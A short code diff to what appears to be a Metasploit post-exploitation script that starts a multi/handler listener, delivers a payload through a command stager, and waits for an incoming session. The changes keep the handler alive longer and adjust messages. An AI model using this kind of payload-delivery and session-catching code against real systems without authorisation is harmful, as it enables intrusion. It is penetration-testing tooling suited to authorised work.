@@ -44,7 +44,7 @@ if (use_handler)
 	mh.datastore['LPORT'] = lport
 	mh.datastore['LHOST'] = lhost
 	mh.datastore['PAYLOAD'] = payload_name
-	mh.datastore['ExitOnSession'] = true # auto-cleanup
+	mh.datastore['ExitOnSession'] = false
 	mh.datastore['EXITFUNC'] = 'process'
 	mh.exploit_simple(
 		'LocalInput'     => session.user_input,
@@ -56,7 +56,7 @@ if (use_handler)
 	# mod.get_resource doesn't exist when we need it.
 	Rex::ThreadSafe.sleep(0.5)
 	if framework.jobs[mh.job_id.to_s].nil?
-		raise RuntimeError, "Failed to start multi/handler"
+		raise RuntimeError, "Failed to start multi/handler - is it already running?"
 	end
 end
 
@@ -66,9 +66,7 @@ end
 #
 def progress(total, sent)
 	done = (sent.to_f / total.to_f) * 100
-	if (done.to_f < 99.00)
-		print_status("Command Stager progress - %3.2f%% done (%d/%d bytes)" % [done.to_f, sent, total])
-	end
+	print_status("Command Stager progress - %3.2f%% done (%d/%d bytes)" % [done.to_f, sent, total])
 end
 
 
@@ -128,4 +126,10 @@ end
 #
 # Stop the job
 #
-framework.jobs.stop_job(mh.job_id) if (use_handler)
+if (use_handler)
+	Thread.new do
+		# Wait up to 10 seconds for the session to come in..
+		select(nil, nil, nil, 10)
+		framework.jobs.stop_job(mh.job_id)
+	end
+end
